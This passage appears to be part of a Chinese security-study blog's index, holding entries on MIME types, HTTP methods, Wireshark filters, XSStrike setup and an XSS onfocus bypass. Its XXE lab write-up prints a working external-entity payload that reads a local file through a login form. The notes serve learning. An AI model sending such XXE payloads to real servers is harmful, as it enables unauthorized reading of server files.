类型列表</h3><table><thead><tr><th>扩展名</th><th>类型&#x2F;子类型</th></tr></thead><tbody><tr><td></td><td>application&#x2F;octet-stream</td></tr><tr><td>323</td><td>text&#x2F;h323</td></tr><tr><td>acx</td><td>application&#x2F;internet-property-stream</td></tr><tr><td>ai</td><td>application&#x2F;postscript</td></tr><tr><td>aif</td><td>audio&#x2F;x-aiff</td></tr><tr><td>aifc</td><td>audio&#x2F;x-aiff</td></tr><tr><td>aiff</td><td>audio&#x2F;x-aiff</td></tr><tr><td>asf</td><td>video&#x2F;x-ms-asf</td></tr><tr><td>asr</td><td>video&#x2F;x-ms-asf</td></tr><tr><td>asx</td><td>video&#x2F;x-ms-asf</td></tr><tr><td>au</td><td>audio&#x2F;basic</td></tr><tr><td>avi</td><td>video&#x2F;x-msvideo</td></tr><tr><td>axs</td><td>application&#x2F;olescript</td></tr><tr><td>bas</td><td>text&#x2F;plain</td></tr><tr><td>bcpio</td><td>application&#x2F;x-bcpio</td></tr><tr><td>bin</td><td>application&#x2F;octet-stream</td></tr><tr><td>bmp</td><td>image&#x2F;bmp</td></tr><tr><td>c</td><td>text&#x2F;plain</td></tr><tr><td>cat</td><td>application&#x2F;vnd.ms-pkiseccat</td></tr><tr><td>cdf</td><td>application&#x2F;x-cdf</td></tr><tr><td>cer</td><td>application&#x2F;x-x509-ca-cert</td></tr><tr><td>class</td><td>application&#x2F;octet-stream</td></tr><tr><td>clp</td><td>application&#x2F;x-msclip</td></tr><tr><td>cmx</td><td>image&#x2F;x-cmx</td></tr><tr><td>cod</td><td>image&#x2F;cis-cod</td></tr><tr><td>cpio</td><td>application&#x2F;x-cpio</td></tr><tr><td>crd</td><td>application&#x2F;x-mscardfile</td></tr><tr><td>crl</td><td>application&#x2F;pkix-crl</td></tr><tr><td>crt</td><td>application&#x2F;x-x509-ca-cert</td></tr><tr><td>csh</td><td>application&#x2F;x-csh</td></tr><tr><td>css</td><td>text&#x2F;css</td></tr><tr><td>dcr</td><td>application&#x2F;x-director</td></tr><tr><td>der</td><td>application&#x2F;x-x509-ca-cert</td></tr><tr><td>dir</td><td>application&#x2F;x-director</td></tr><tr><td>dll</td><td>application&#x2F;x-msdownload</td></tr><tr><td>dms</td><td>application&#x2F;octet-stream</td></tr><tr><td>doc</td><td>application&#x2F;msword</td></tr><tr><td>dot</td><td>application&#x2F;msword</td></tr><tr><td>dvi</td><td>application&#x2F;x-dvi</td></tr><tr><td>dxr</td><td>application&#x2F;x-director</td></tr><tr><td>eps</td><td>application&#x2F;postscript</td></tr><tr><td>etx</td><td>text&#x2F;x-setext</td></tr><tr><td>evy</td><td>application&#x2F;envoy</td></tr><tr><td>exe</td><td>application&#x2F;octet-stream</td></tr><tr><td>fif</td><td>application&#x2F;fractals</td></tr><tr><td>flr</td><td>x-world&#x2F;x-vrml</td></tr><tr><td>gif</td><td>image&#x2F;gif</td></tr><tr><td>gtar</td><td>application&#x2F;x-gtar</td></tr><tr><td>gz</td><td>application&#x2F;x-gzip</td></tr><tr><td>h</td><td>text&#x2F;plain</td></tr><tr><td>hdf</td><td>application&#x2F;x-hdf</td></tr><tr><td>hlp</td><td>application&#x2F;winhlp</td></tr><tr><td>hqx</td><td>application&#x2F;mac-binhex40</td></tr><tr><td>hta</td><td>application&#x2F;hta</td></tr><tr><td>htc</td><td>text&#x2F;x-component</td></tr><tr><td>htm</td><td>text&#x2F;html</td></tr><tr><td>html</td><td>text&#x2F;html</td></tr><tr><td>htt</td><td>text&#x2F;webviewhtml</td></tr><tr><td>ico</td><td>image&#x2F;x-icon</td></tr><tr><td>ief</td><td>image&#x2F;ief</td></tr><tr><td>iii</td><td>application&#x2F;x-iphone</td></tr><tr><td>ins</td><td>application&#x2F;x-internet-signup</td></tr><tr><td>isp</td><td>application&#x2F;x-internet-signup</td></tr><tr><td>jfif</td><td>image&#x2F;pipeg</td></tr><tr><td>jpe</td><td>image&#x2F;jpeg</td></tr><tr><td>jpeg</td><td>image&#x2F;jpeg</td></tr><tr><td>jpg</td><td>image&#x2F;jpeg</td></tr><tr><td>js</td><td>application&#x2F;x-javascript</td></tr><tr><td>latex</td><td>application&#x2F;x-latex</td></tr><tr><td>lha</td><td>application&#x2F;octet-stream</td></tr><tr><td>lsf</td><td>video&#x2F;x-la-asf</td></tr><tr><td>lsx</td><td>video&#x2F;x-la-asf</td></tr><tr><td>lzh</td><td>application&#x2F;octet-stream</td></tr><tr><td>m13</td><td>application&#x2F;x-msmediaview</td></tr><tr><td>m14</td><td>application&#x2F;x-msmediaview</td></tr><tr><td>m3u</td><td>audio&#x2F;x-mpegurl</td></tr><tr><td>man</td><td>application&#x2F;x-troff-man</td></tr><tr><td>mdb</td><td>application&#x2F;x-msaccess</td></tr><tr><td>me</td><td>application&#x2F;x-troff-me</td></tr><tr><td>mht</td><td>message&#x2F;rfc822</td></tr><tr><td>mhtml</td><td>message&#x2F;rfc822</td></tr><tr><td>mid</td><td>audio&#x2F;mid</td></tr><tr><td>mny</td><td>application&#x2F;x-msmoney</td></tr><tr><td>mov</td><td>video&#x2F;quicktime</td></tr><tr><td>movie</td><td>video&#x2F;x-sgi-movie</td></tr><tr><td>mp2</td><td>video&#x2F;mpeg</td></tr><tr><td>mp3</td><td>audio&#x2F;mpeg</td></tr><tr><td>mpa</td><td>video&#x2F;mpeg</td></tr><tr><td>mpe</td><td>video&#x2F;mpeg</td></tr><tr><td>mpeg</td><td>video&#x2F;mpeg</td></tr><tr><td>mpg</td><td>video&#x2F;mpeg</td></tr><tr><td>mpp</td><td>application&#x2F;vnd.ms-project</td></tr><tr><td>mpv2</td><td>video&#x2F;mpeg</td></tr><tr><td>ms</td><td>application&#x2F;x-troff-ms</td></tr><tr><td>mvb</td><td>application&#x2F;x-msmediaview</td></tr><tr><td>nws</td><td>message&#x2F;rfc822</td></tr><tr><td>oda</td><td>application&#x2F;oda</td></tr><tr><td>p10</td><td>application&#x2F;pkcs10</td></tr><tr><td>p12</td><td>application&#x2F;x-pkcs12</td></tr><tr><td>p7b</td><td>application&#x2F;x-pkcs7-certificates</td></tr><tr><td>p7c</td><td>application&#x2F;x-pkcs7-mime</td></tr><tr><td>p7m</td><td>application&#x2F;x-pkcs7-mime</td></tr><tr><td>p7r</td><td>application&#x2F;x-pkcs7-certreqresp</td></tr><tr><td>p7s</td><td>application&#x2F;x-pkcs7-signature</td></tr><tr><td>pbm</td><td>image&#x2F;x-portable-bitmap</td></tr><tr><td>pdf</td><td>application&#x2F;pdf</td></tr><tr><td>pfx</td><td>application&#x2F;x-pkcs12</td></tr><tr><td>pgm</td><td>image&#x2F;x-portable-graymap</td></tr><tr><td>pko</td><td>application&#x2F;ynd.ms-pkipko</td></tr><tr><td>pma</td><td>application&#x2F;x-perfmon</td></tr><tr><td>pmc</td><td>application&#x2F;x-perfmon</td></tr><tr><td>pml</td><td>application&#x2F;x-perfmon</td></tr><tr><td>pmr</td><td>application&#x2F;x-perfmon</td></tr><tr><td>pmw</td><td>application&#x2F;x-perfmon</td></tr><tr><td>pnm</td><td>image&#x2F;x-portable-anymap</td></tr><tr><td>pot,</td><td>application&#x2F;vnd.ms-powerpoint</td></tr><tr><td>ppm</td><td>image&#x2F;x-portable-pixmap</td></tr><tr><td>pps</td><td>application&#x2F;vnd.ms-powerpoint</td></tr><tr><td>ppt</td><td>application&#x2F;vnd.ms-powerpoint</td></tr><tr><td>prf</td><td>application&#x2F;pics-rules</td></tr><tr><td>ps</td><td>application&#x2F;postscript</td></tr><tr><td>pub</td><td>application&#x2F;x-mspublisher</td></tr><tr><td>qt</td><td>video&#x2F;quicktime</td></tr><tr><td>ra</td><td>audio&#x2F;x-pn-realaudio</td></tr><tr><td>ram</td><td>audio&#x2F;x-pn-realaudio</td></tr><tr><td>ras</td><td>image&#x2F;x-cmu-raster</td></tr><tr><td>rgb</td><td>image&#x2F;x-rgb</td></tr><tr><td>rmi</td><td>audio&#x2F;mid</td></tr><tr><td>roff</td><td>application&#x2F;x-troff</td></tr><tr><td>rtf</td><td>application&#x2F;rtf</td></tr><tr><td>rtx</td><td>text&#x2F;richtext</td></tr><tr><td>scd</td><td>application&#x2F;x-msschedule</td></tr><tr><td>sct</td><td>text&#x2F;scriptlet</td></tr><tr><td>setpay</td><td>application&#x2F;set-payment-initiation</td></tr><tr><td>setreg</td><td>application&#x2F;set-registration-initiation</td></tr><tr><td>sh</td><td>application&#x2F;x-sh</td></tr><tr><td>shar</td><td>application&#x2F;x-shar</td></tr><tr><td>sit</td><td>application&#x2F;x-stuffit</td></tr><tr><td>snd</td><td>audio&#x2F;basic</td></tr><tr><td>spc</td><td>application&#x2F;x-pkcs7-certificates</td></tr><tr><td>spl</td><td>application&#x2F;futuresplash</td></tr><tr><td>src</td><td>application&#x2F;x-wais-source</td></tr><tr><td>sst</td><td>application&#x2F;vnd.ms-pkicertstore</td></tr><tr><td>stl</td><td>application&#x2F;vnd.ms-pkistl</td></tr><tr><td>stm</td><td>text&#x2F;html</td></tr><tr><td>svg</td><td>image&#x2F;svg+xml</td></tr><tr><td>sv4cpio</td><td>application&#x2F;x-sv4cpio</td></tr><tr><td>sv4crc</td><td>application&#x2F;x-sv4crc</td></tr><tr><td>swf</td><td>application&#x2F;x-shockwave-flash</td></tr><tr><td>t</td><td>application&#x2F;x-troff</td></tr><tr><td>tar</td><td>application&#x2F;x-tar</td></tr><tr><td>tcl</td><td>application&#x2F;x-tcl</td></tr><tr><td>tex</td><td>application&#x2F;x-tex</td></tr><tr><td>texi</td><td>application&#x2F;x-texinfo</td></tr><tr><td>texinfo</td><td>application&#x2F;x-texinfo</td></tr><tr><td>tgz</td><td>application&#x2F;x-compressed</td></tr><tr><td>tif</td><td>image&#x2F;tiff</td></tr><tr><td>tiff</td><td>image&#x2F;tiff</td></tr><tr><td>tr</td><td>application&#x2F;x-troff</td></tr><tr><td>trm</td><td>application&#x2F;x-msterminal</td></tr><tr><td>tsv</td><td>text&#x2F;tab-separated-values</td></tr><tr><td>txt</td><td>text&#x2F;plain</td></tr><tr><td>uls</td><td>text&#x2F;iuls</td></tr><tr><td>ustar</td><td>application&#x2F;x-ustar</td></tr><tr><td>vcf</td><td>text&#x2F;x-vcard</td></tr><tr><td>vrml</td><td>x-world&#x2F;x-vrml</td></tr><tr><td>wav</td><td>audio&#x2F;x-wav</td></tr><tr><td>wcm</td><td>application&#x2F;vnd.ms-works</td></tr><tr><td>wdb</td><td>application&#x2F;vnd.ms-works</td></tr><tr><td>wks</td><td>application&#x2F;vnd.ms-works</td></tr><tr><td>wmf</td><td>application&#x2F;x-msmetafile</td></tr><tr><td>wps</td><td>application&#x2F;vnd.ms-works</td></tr><tr><td>wri</td><td>application&#x2F;x-mswrite</td></tr><tr><td>wrl</td><td>x-world&#x2F;x-vrml</td></tr><tr><td>wrz</td><td>x-world&#x2F;x-vrml</td></tr><tr><td>xaf</td><td>x-world&#x2F;x-vrml</td></tr><tr><td>xbm</td><td>image&#x2F;x-xbitmap</td></tr><tr><td>xla</td><td>application&#x2F;vnd.ms-excel</td></tr><tr><td>xlc</td><td>application&#x2F;vnd.ms-excel</td></tr><tr><td>xlm</td><td>application&#x2F;vnd.ms-excel</td></tr><tr><td>xls</td><td>application&#x2F;vnd.ms-excel</td></tr><tr><td>xlt</td><td>application&#x2F;vnd.ms-excel</td></tr><tr><td>xlw</td><td>application&#x2F;vnd.ms-excel</td></tr><tr><td>xof</td><td>x-world&#x2F;x-vrml</td></tr><tr><td>xpm</td><td>image&#x2F;x-xpixmap</td></tr><tr><td>xwd</td><td>image&#x2F;x-xwindowdump</td></tr><tr><td>z</td><td>application&#x2F;x-compress</td></tr><tr><td>zip</td><td>application&#x2F;zip</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>HTTP教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MIME 类型</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE-labs</title>
    <link href="/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/XXE-labs/"/>
    <url>/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/XXE-labs/</url>
    
    <content type="html"><![CDATA[<h1 id="XXE-labs"><a href="#XXE-labs" class="headerlink" title="XXE-labs"></a>XXE-labs</h1><blockquote><p>我发现输入得用户名以 &#x3D;&#x3D;弹窗（alert）&#x3D;&#x3D; 的形式输出</p></blockquote><p><img src="/.com//image-20250422222903-k9ji6kx.png" alt="image">​</p><blockquote><p>同时 F12 进行前端查看 发现 在提交按钮处有</p><p>​<code>&lt;button id=&quot;go&quot; onclick=&quot;XMLFunction()&quot;&gt;GO!&lt;/button&gt;</code>​</p></blockquote><p>&#x3D;&#x3D;说明我们的 数据传输方式为 xml&#x3D;&#x3D;<br> 当然，我们也可以直接 在burp suite 进行抓包查看</p><p><img src="/.com//image-20250422223115-kr6nf3v.png" alt="image">​</p><blockquote><p>我们看到了 xml 文档声明：</p><p>​<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code>​</p></blockquote><p>所以，可能存在 xxe 漏洞</p><p> 我们构造payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>2333<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。<br>因此，在这里我们利用 这一特性 我们在向服务器上传的文档中 使用外部实体 (通过引用定义在外部的 DTD 中的实体，我们称之为外部实体) 来访问我们 的 flag<br>有人可能会问 flag 也不会是 dtd 文件啊<br>我们在使用外部实体访问的时候，会对我们访问的文件进行检查是否为 dtd 文件，此时如果没有检测的话，就可以引用非dtd文件<br>造成漏洞，这就是xxe</p></blockquote><p>所以到了这个时候，我们也就能够明白我们上面构造的payload的含义了：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>    <span class="hljs-comment">&lt;!--使用admin实体--&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span>                        <span class="hljs-comment">&lt;!--声明admin实体--&gt;</span><br></code></pre></td></tr></table></figure><p>在这里 usename 和 password 都存在 xxe 漏洞，所以两者之间 都可以进行 xxe 注入</p><p> 点击 go 发现 flag</p><p><img src="/.com//40ff3cea6e98dbb09db72be6393d5d29-20250422223739-segc056.png" alt="40ff3cea6e98dbb09db72be6393d5d29"></p><p>当然在这里我们也可以 使用 postman （本质是一样的，都是传递参数 将我们的payload传递到后台 php）</p><p> 我们查看源代码，发现是 post 传参</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>        <span class="hljs-keyword">function</span> <span class="hljs-title function_">XMLFunction</span>(<span class="hljs-params"></span>)&#123;<br>            <span class="hljs-keyword">var</span> xml = <span class="hljs-string">&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27;</span> +<br>            <span class="hljs-string">&#x27;&lt;root&gt;&#x27;</span> +<br>            <span class="hljs-string">&#x27; &lt;username&gt;&#x27;</span> + $(<span class="hljs-string">&#x27;#username&#x27;</span>).<span class="hljs-title function_">val</span>() + <span class="hljs-string">&#x27;&lt;/username&gt;&#x27;</span> +<br>            <span class="hljs-string">&#x27; &lt;password&gt;&#x27;</span> + $(<span class="hljs-string">&#x27;#password&#x27;</span>).<span class="hljs-title function_">val</span>() + <span class="hljs-string">&#x27;&lt;/password&gt;&#x27;</span> +<br>            <span class="hljs-string">&#x27; &lt;/root&gt;&#x27;</span>; &lt;!--转化数据格式   串行格式化数据--&gt;<br>            <span class="hljs-keyword">var</span> xmlhttp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();   &lt;!--实例化<span class="hljs-title class_">XMLHttpRequest</span> 对象--&gt;<br>            xmlhttp.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123; &lt;!--页面初始化--&gt;<br>                <span class="hljs-keyword">if</span>(xmlhttp.<span class="hljs-property">readyState</span> == <span class="hljs-number">4</span>)&#123; &lt;!--实时跟踪异步响应状态，监听函数 readyState4 数据接收完毕  此时可以获取完整的响应数据--&gt;<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(xmlhttp.<span class="hljs-property">readyState</span>);<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(xmlhttp.<span class="hljs-property">responseText</span>);  &lt;!--接受数据--&gt;<br>                    <span class="hljs-title function_">alert</span>(xmlhttp.<span class="hljs-property">responseText</span>);&lt;!--弹窗 接受数据--&gt;<br><br>                &#125;<br>            &#125;  <br>            xmlhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>,<span class="hljs-string">&quot;login.php&quot;</span>,<span class="hljs-literal">true</span>); &lt;!---建立 post请求，要求异步响应   xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, url, <span class="hljs-literal">false</span>)--&gt;<br>            xmlhttp.<span class="hljs-title function_">send</span>(xml);  &lt;!--发送请求--&gt;<br>        &#125;;<br>    &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>上面有两点值得我们注意：</p><ol><li>是 post 传参</li><li>接受地址是 login.php</li></ol><p> 现在我们使用 postman 了</p><p><img src="/.com//454b83cf5da1b573bd3c3081543785ab-20250422223813-1wlcleh.png" alt="454b83cf5da1b573bd3c3081543785ab">​</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>XXE（XML外部实体注入）</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XXE-labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>绕过</title>
    <link href="/2025/05/20/Web/XSS/%E7%BB%95%E8%BF%87/"/>
    <url>/2025/05/20/Web/XSS/%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="onfocus事件绕过"><a href="#onfocus事件绕过" class="headerlink" title="onfocus事件绕过"></a>onfocus事件绕过</h2><blockquote><p>先简单介绍一下onfocus事件</p><p><img src="/.com//012bdfc49a3aa8cc5ab09556c096a09d-20250425091406-03qo9je.png" alt="012bdfc49a3aa8cc5ab09556c096a09d">​  </p><p>onfocus事件在元素<strong>获得焦点</strong>时触发，最常与  <strong>&lt;input&gt;</strong> 、 <strong>&lt;select&gt;</strong>  和  <strong>&lt;a&gt;</strong>  标签一起使用，以上面图片的html标签 <strong>&lt;input&gt;</strong> 为例， <strong>&lt;input&gt;</strong> 标签是有输入框的，简单来说，<strong>onfocus事件</strong>就是当<strong>输入框被点击</strong>的时候，就会触发<strong>myFunction()</strong> 函数，然后我们再配合<strong>javascript伪协议</strong>来执行javascript代码</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>XSS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP请求方法</title>
    <link href="/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/"/>
    <url>/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h1><p>HTTP 请求方法定义了客户端和服务器之间的通信方式。</p><p>根据 HTTP 标准，HTTP 请求可以使用多种请求方法。</p><p>以下是常见的 HTTP 请求方法列表：</p><table><thead><tr><th>序号</th><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>GET</td><td>从<strong>服务器获取资源</strong>。用于<strong>请求数据</strong>而<strong>不对数据进行更改</strong>。例如，从服务器获取网页、图片等。</td></tr><tr><td>2</td><td>POST</td><td>向服务器<strong>发送数据</strong>以<strong>创建新资源</strong>。常用于<strong>提交表单数据</strong>或<strong>上传文件</strong>。发送的数据包含在请求体中。</td></tr><tr><td>3</td><td>PUT</td><td>向服务器<strong>发送数据</strong>以<strong>更新现有资源</strong>。如果<strong>资源不存在</strong>，则<strong>创建新的资源</strong>。与 POST 不同，PUT 通常是幂等的，即多<strong>次执行相同的 PUT</strong> 请求不会<strong>产生不同的结果</strong>。</td></tr><tr><td>4</td><td>DELETE</td><td>从服务器<strong>删除指定的资源</strong>。请求中包含要<strong>删除的资源标识符</strong>。</td></tr><tr><td>5</td><td>PATCH</td><td>对<strong>资源</strong>进行<strong>部分修改</strong>。与 PUT 类似，但 <strong>PATCH</strong> 只<strong>更改部分数据</strong>而不是<strong>替换整个资源</strong>。</td></tr><tr><td>6</td><td>HEAD</td><td><strong>类似于 GET</strong>，但服务器<strong>只返回响应的头部</strong>，不<strong>返回实际数据</strong>。用于<strong>检查资源的元数据</strong>（例如，检查资源是否存在，查看响应的头部信息）。</td></tr><tr><td>7</td><td>OPTIONS</td><td>返回服务器支持的 <strong>HTTP 方法</strong>。用于<strong>检查服务器支持</strong>哪些<strong>请求方法</strong>，通常用于<strong>跨域资源共享（CORS）的预检请求</strong>。</td></tr><tr><td>8</td><td>TRACE</td><td><strong>回显服务器收到的请求</strong>，主要<strong>用于诊断</strong>。客户端可以<strong>查看请求在服务器</strong>中的<strong>处理路径</strong>。</td></tr><tr><td>9</td><td>CONNECT</td><td>建立一个<strong>到服务器的隧道</strong>，通常<strong>用于 HTTPS</strong> 连接。客户端可以通过该<strong>隧道发送加密</strong>的数据。</td></tr></tbody></table><h2 id="各个版本定义的请求方法"><a href="#各个版本定义的请求方法" class="headerlink" title="各个版本定义的请求方法"></a>各个版本定义的请求方法</h2><h3 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP&#x2F;1.0"></a>HTTP&#x2F;1.0</h3><p>HTTP&#x2F;1.0 定义了以下三种请求方法：</p><ul><li><strong>GET</strong> - 请求指定的资源。</li><li><strong>POST</strong> - 提交数据以处理请求。</li><li><strong>HEAD</strong> - 请求资源的响应头信息。</li></ul><h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP&#x2F;1.1"></a>HTTP&#x2F;1.1</h3><p>HTTP&#x2F;1.1 引入了更多的方法：</p><ul><li><strong>GET</strong> - 请求指定的资源。</li><li><strong>POST</strong> - 提交数据以处理请求。</li><li><strong>HEAD</strong> - 请求资源的响应头信息。</li><li><strong>PUT</strong> - 上传文件或者更新资源。</li><li><strong>DELETE</strong> - 删除指定的资源。</li><li><strong>OPTIONS</strong> - 请求获取服务器支持的请求方法。</li><li><strong>TRACE</strong> - 回显服务器收到的请求，主要用于诊断。</li><li><strong>CONNECT</strong> - 建立一个隧道用于代理服务器的通信，通常用于 HTTPS。</li></ul><h3 id="HTTP-2"><a href="#HTTP-2" class="headerlink" title="HTTP&#x2F;2"></a>HTTP&#x2F;2</h3><p>HTTP&#x2F;2 基本上沿用了 HTTP&#x2F;1.1 的方法，但对协议进行了优化，提高了传输效率和速度。HTTP&#x2F;2 也引入了新的特性，如<strong>多路复用、头部压缩和服务器推送</strong>等。</p><h3 id="HTTP-3"><a href="#HTTP-3" class="headerlink" title="HTTP&#x2F;3"></a>HTTP&#x2F;3</h3><p>HTTP&#x2F;3 基于 QUIC 协议实现，继续使用 HTTP&#x2F;2 的方法。HTTP&#x2F;3 主要<strong>改进了传输层</strong>，使用 <strong>UDP 代替 TCP</strong> 以提高传输速度和可靠性。</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>HTTP教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTTP请求方法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Wireshark</title>
    <link href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Wireshark/"/>
    <url>/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Wireshark/</url>
    
    <content type="html"><![CDATA[<h1 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h1><ul><li>打开wireshark，开始抓包。抓HTTP的包在搜索框中搜索HTTP即可，</li><li>request和response分开搜索。 <strong>搜索request包在搜索框中搜索http.request。搜索response包在搜索框中搜索http.response。</strong></li></ul>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Wireshark</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xsstrike</title>
    <link href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/"/>
    <url>/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/</url>
    
    <content type="html"><![CDATA[<h1 id="xsstrike"><a href="#xsstrike" class="headerlink" title="xsstrike"></a>xsstrike</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/s0md3v/XSStrike.git<br></code></pre></td></tr></table></figure><h3 id="方法-1：创建软链接到系统路径（推荐）"><a href="#方法-1：创建软链接到系统路径（推荐）" class="headerlink" title="方法 1：创建软链接到系统路径（推荐）"></a><strong>方法 1：创建软链接到系统路径（推荐）</strong></h3><ol><li><p><strong>确保脚本可执行</strong></p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x /path/to/xsstrike.py  <span class="hljs-comment"># 赋予执行权限</span><br></code></pre></td></tr></table></figure><p> <em>如果脚本第一行没有 Shebang（如</em>  <em>​<code>#!/usr/bin/env python3</code>​</em>​ <em>），需手动添加。</em></p></li><li><p><strong>创建软链接到</strong>  <strong>​<code>/usr/local/bin</code>​</strong>​</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">ln</span> -s /path/to/xsstrike.py /usr/local/bin/xsstrike<br></code></pre></td></tr></table></figure><ul><li>​<code>/usr/local/bin</code>​ 是用户级全局命令的标准路径，无需修改 <code>PATH</code>​ 变量。</li><li>完成后，任意位置输入 <code>xsstrike</code>​ 即可运行脚本。</li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xsstrike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap</title>
    <link href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/"/>
    <url>/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/</url>
    
